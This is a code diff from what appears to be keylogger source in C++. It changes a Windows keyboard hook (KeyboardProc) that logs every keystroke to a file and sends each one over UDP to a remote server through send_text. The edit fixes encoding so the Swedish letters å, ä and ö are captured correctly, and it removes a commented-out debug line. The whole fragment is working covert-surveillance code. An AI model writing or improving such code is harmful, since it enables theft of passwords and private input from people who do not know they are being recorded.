@@ -132,7 +132,6 @@ static inline bool is_base64(unsigned char c) {
 void send_text(string data, SOCKET out, SOCKADDR_IN server) {
 	string size = to_string(data.length());
 	string typ = "TEXT";
-	//cout << typ << " : " << size << " : " << data;
 	auto sendtyp = sendto(out, typ.c_str(), typ.size() + 1, 0, reinterpret_cast<sockaddr*>(&server), sizeof(server));
 	auto sendpre = sendto(out, size.c_str(), size.size() + 1, 0, reinterpret_cast<sockaddr*>(&server), sizeof(server));
 	auto senddur = sendto(out, data.c_str(), data.size() + 1, 0, reinterpret_cast<sockaddr*>(&server), sizeof(server));
@@ -292,19 +291,19 @@ LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
 			logfile << "-";
 			break;
 		case 221:
-			send_text("�");
-			cout << "�";
-			logfile << "�";
+			send_text("å");
+			cout << "å";
+			logfile << "å";
 			break;
 		case 222:
-			send_text("�");
-			cout << "�";
-			logfile << "�";
+			send_text("ä");
+			cout << "ä";
+			logfile << "ä";
 			break;
 		case 192:
-			send_text("�");
-			cout << "�";
-			logfile << "�";
+			send_text("ö");
+			cout << "ö";
+			logfile << "ö";
 			break;
 		default:
 			if (windows && (current_key >= 65 && current_key <= 90)) {
